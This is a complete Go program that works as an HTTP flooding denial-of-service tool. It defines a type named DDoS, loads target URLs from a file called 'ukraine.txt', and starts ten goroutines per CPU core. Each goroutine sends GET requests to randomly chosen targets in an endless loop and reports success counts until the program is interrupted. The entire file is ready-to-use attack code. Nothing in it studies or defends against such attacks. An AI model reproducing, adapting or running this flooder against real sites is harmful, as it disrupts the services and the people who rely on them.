package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"bufio"
	"net"
	"net/http"
	"net/url"
	"time"
	"runtime"
	"sync/atomic"
	"math/rand"
	"os"
	"os/signal"
	"syscall"
	"strings"
)

const PerCore = 10
const FilePath = "ukraine.txt"
const timeout = time.Duration(5 * time.Second)

type DDoS struct {
	urls           []string
	amountWorkers int

	successRequest int64
	amountRequests int64
}

func New(urls []string, workers int) (*DDoS, error) {
	return &DDoS{
		urls:          urls,
		amountWorkers: workers,
	}, nil
}

func dialTimeout(network, addr string) (net.Conn, error) {
    return net.DialTimeout(network, addr, timeout)
}

func (d *DDoS) Run() {
	transport := http.Transport{
        Dial: dialTimeout,
    }

    client := http.Client{
        Transport: &transport,
    }

	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				randomUrl := d.urls[rand.Intn(len(d.urls))]
				fmt.Println("loading", randomUrl)
				success, total := d.Result()
				fmt.Println("success / total:", success, " / ", total)
				resp, err := client.Get(randomUrl)
				atomic.AddInt64(&d.amountRequests, 1)
				if err == nil {
					atomic.AddInt64(&d.successRequest, 1)
					_, _ = io.Copy(ioutil.Discard, resp.Body)
					_ = resp.Body.Close()
				}
				runtime.Gosched()
			}
		}()
	}
}

func (d DDoS) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func readFile() ([]string) {
    file, err := os.Open(FilePath)
    if err != nil {
        panic(err)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)

    var lines []string

    var line string

    for scanner.Scan() {
    	line = strings.TrimSpace(scanner.Text())

    	if line != "" {
			u, err := url.Parse(line)

			if err != nil || len(u.Host) == 0 {
				panic(fmt.Errorf("Undefined host or error = %v", err))
			}

	    	lines = append(lines, line)
	    }
    }

    if err := scanner.Err(); err != nil {
        panic(err)
    }

    return lines
}

func main() {
	d, err := New(readFile(), runtime.NumCPU() * PerCore)

	if err != nil {
		panic(err)
	}

	d.Run()

	c := make(chan os.Signal)
    signal.Notify(c, os.Interrupt, syscall.SIGTERM)
    go func() {
        <-c
		success, total := d.Result()

		fmt.Println("success / total:", success, " / ", total)
		os.Exit(1)
    }()

    select{}
}